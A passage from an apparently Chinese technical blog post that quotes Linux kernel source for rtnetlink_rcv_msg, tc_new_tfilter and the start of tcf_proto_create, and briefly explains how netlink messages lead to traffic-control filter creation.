class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">rtnl_kinds</span> <span class="title">kind</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">rtnl_doit_func doit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">int</span> family;</span><br><span class="line"><span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line"><span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">kind = rtnl_msgtype_kind(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kind != RTNL_KIND_GET &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line"><span class="keyword">if</span> (kind == RTNL_KIND_GET &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">rtnl_dumpit_func dumpit;</span><br><span class="line">u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">family = PF_UNSPEC;</span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line"><span class="keyword">goto</span> err_unlock;</span><br><span class="line">&#125;</span><br><span class="line">owner = link-&gt;owner;</span><br><span class="line">dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">rtnl = net-&gt;rtnl;</span><br><span class="line"><span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">.dump= dumpit,</span><br><span class="line">.min_dump_alloc= min_dump_alloc,</span><br><span class="line">.<span class="keyword">module</span>= owner,</span><br><span class="line">&#125;;</span><br><span class="line">err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line"><span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment"> * module if dump is still in progress.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_put(owner);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">family = PF_UNSPEC;</span><br><span class="line">link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line"><span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">owner = link-&gt;owner;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flags = link-&gt;flags;</span><br><span class="line"><span class="keyword">if</span> (kind == RTNL_KIND_DEL &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_BULK) &amp;&amp;</span><br><span class="line">    !(flags &amp; RTNL_FLAG_BULK_DEL_SUPPORTED)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Bulk delete is not supported&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> err_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">doit = link-&gt;doit;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (doit)</span><br><span class="line">err = doit(skb, nlh, extack);</span><br><span class="line">module_put(owner);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">rtnl_lock();</span><br><span class="line">link = rtnl_get_link(family, type);</span><br><span class="line"><span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">rtnl_unlock();</span><br><span class="line"></span><br><span class="line">module_put(owner);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到函数的主要逻辑，首先是在消息中取出其<code>family</code>和<code>type</code>，紧接着根绝<code>family</code>和<code>type</code>回去到<code>link</code>。在最后调用<code>link-&gt;doit(skb, nlh, extack)</code>，由前面的函数可以得知的是其会调用如下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tc_new_tfilter</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *n,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tca</span>[<span class="title">TCA_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">char</span> name[IFNAMSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span>;</span></span><br><span class="line">u32 protocol;</span><br><span class="line">u32 prio;</span><br><span class="line"><span class="keyword">bool</span> prio_allocate;</span><br><span class="line">u32 parent;</span><br><span class="line">u32 chain_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qdisc</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain_info</span> <span class="title">chain_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_block</span> *<span class="title">block</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cl;</span><br><span class="line"><span class="keyword">void</span> *fh;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">int</span> tp_created;</span><br><span class="line"><span class="keyword">bool</span> rtnl_held = <span class="literal">false</span>;</span><br><span class="line">u32 flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_ns_capable(skb, net-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">replay:</span><br><span class="line">tp_created = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = nlmsg_parse_deprecated(n, <span class="keyword">sizeof</span>(*t), tca, TCA_MAX,</span><br><span class="line">     rtm_tca_policy, extack);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">t = nlmsg_data(n);</span><br><span class="line">protocol = TC_H_MIN(t-&gt;tcm_info);</span><br><span class="line">prio = TC_H_MAJ(t-&gt;tcm_info);</span><br><span class="line">prio_allocate = <span class="literal">false</span>;</span><br><span class="line">parent = t-&gt;tcm_parent;</span><br><span class="line">tp = <span class="literal">NULL</span>;</span><br><span class="line">cl = <span class="number">0</span>;</span><br><span class="line">block = <span class="literal">NULL</span>;</span><br><span class="line">q = <span class="literal">NULL</span>;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prio == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* If no priority is provided by the user,</span></span><br><span class="line"><span class="comment"> * we allocate one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_CREATE) &#123;</span><br><span class="line">prio = TC_H_MAKE(<span class="number">0x80000000</span>U, <span class="number">0U</span>);</span><br><span class="line">prio_allocate = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Invalid filter command with priority of zero&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find head of filter chain. */</span></span><br><span class="line"></span><br><span class="line">err = __tcf_qdisc_find(net, &amp;q, &amp;parent, t-&gt;tcm_ifindex, <span class="literal">false</span>, extack);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take rtnl mutex if rtnl_held was set to true on previous iteration,</span></span><br><span class="line"><span class="comment"> * block is shared (no qdisc found), qdisc is not unlocked, classifier</span></span><br><span class="line"><span class="comment"> * type is not specified, classifier is not unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (rtnl_held ||</span><br><span class="line">    (q &amp;&amp; !(q-&gt;ops-&gt;cl_ops-&gt;flags &amp; QDISC_CLASS_OPS_DOIT_UNLOCKED)) ||</span><br><span class="line">    !tcf_proto_is_unlocked(name)) &#123;</span><br><span class="line">rtnl_held = <span class="literal">true</span>;</span><br><span class="line">rtnl_lock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = __tcf_qdisc_cl_find(q, parent, &amp;cl, t-&gt;tcm_ifindex, extack);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">block = __tcf_block_find(net, q, cl, t-&gt;tcm_ifindex, t-&gt;tcm_block_index,</span><br><span class="line"> extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(block)) &#123;</span><br><span class="line">err = PTR_ERR(block);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">block-&gt;classid = parent;</span><br><span class="line"></span><br><span class="line">chain_index = tca[TCA_CHAIN] ? nla_get_u32(tca[TCA_CHAIN]) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (chain_index &gt; TC_ACT_EXT_VAL_MASK) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified chain index exceeds upper limit&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">chain = tcf_chain_get(block, chain_index, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!chain) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Cannot create specified filter chain&quot;</span>);</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">       prio, prio_allocate);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">err = PTR_ERR(tp);</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tp == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp_new</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;flushing) &#123;</span><br><span class="line">err = -EAGAIN;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Proto-tcf does not exist, create new one */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tca[TCA_KIND] == <span class="literal">NULL</span> || !protocol) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter kind and protocol must be specified&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> errout_locked;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (prio_allocate)</span><br><span class="line">prio = tcf_auto_prio(tcf_chain_tp_prev(chain,</span><br><span class="line">       &amp;chain_info));</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">  rtnl_held, extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">err = PTR_ERR(tp_new);</span><br><span class="line"><span class="keyword">goto</span> errout_tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp_created = <span class="number">1</span>;</span><br><span class="line">tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">rtnl_held);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">err = PTR_ERR(tp);</span><br><span class="line"><span class="keyword">goto</span> errout_tp;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tca[TCA_KIND] &amp;&amp; nla_strcmp(tca[TCA_KIND], tp-&gt;ops-&gt;kind)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified filter kind does not match existing one&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fh) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;</span>);</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">tfilter_put(tp, fh);</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter already exists&quot;</span>);</span><br><span class="line">err = -EEXIST;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;tmplt_ops &amp;&amp; chain-&gt;tmplt_ops != tp-&gt;ops) &#123;</span><br><span class="line">NL_SET_ERR_MSG(extack, <span class="string">&quot;Chain template is set to a different filter kind&quot;</span>);</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line">flags |= TCA_ACT_FLAGS_REPLACE;</span><br><span class="line"><span class="keyword">if</span> (!rtnl_held)</span><br><span class="line">flags |= TCA_ACT_FLAGS_NO_RTNL;</span><br><span class="line">err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">      flags, extack);</span><br><span class="line"><span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">tfilter_put(tp, fh);</span><br><span class="line"><span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line"><span class="keyword">if</span> (q)</span><br><span class="line">q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line"><span class="keyword">if</span> (err &amp;&amp; tp_created)</span><br><span class="line">tcf_chain_tp_delete_empty(chain, tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line">errout_tp:</span><br><span class="line"><span class="keyword">if</span> (chain) &#123;</span><br><span class="line"><span class="keyword">if</span> (tp &amp;&amp; !IS_ERR(tp))</span><br><span class="line">tcf_proto_put(tp, rtnl_held, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!tp_created)</span><br><span class="line">tcf_chain_put(chain);</span><br><span class="line">&#125;</span><br><span class="line">tcf_block_release(q, block, rtnl_held);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rtnl_held)</span><br><span class="line">rtnl_unlock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line"><span class="comment">/* Take rtnl lock in case EAGAIN is caused by concurrent flush</span></span><br><span class="line"><span class="comment"> * of target chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">rtnl_held = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* Replay the request. */</span></span><br><span class="line"><span class="keyword">goto</span> replay;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">errout_locked:</span><br><span class="line">mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单说一下上面函数的逻辑，首先通过<code>tcf_proto_check_kind(tca[TCA_KIND], name)</code>获取过滤器的名字，随后通过<code>tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol, prio, prio_allocate)</code>获取指定协议的过滤器tp，如果tp为null则会创建新的tp，这里通过<code>tp_new = tcf_proto_create(name, protocol, prio, chain, rtnl_held, extack);</code>函数进行创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!tp)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">err 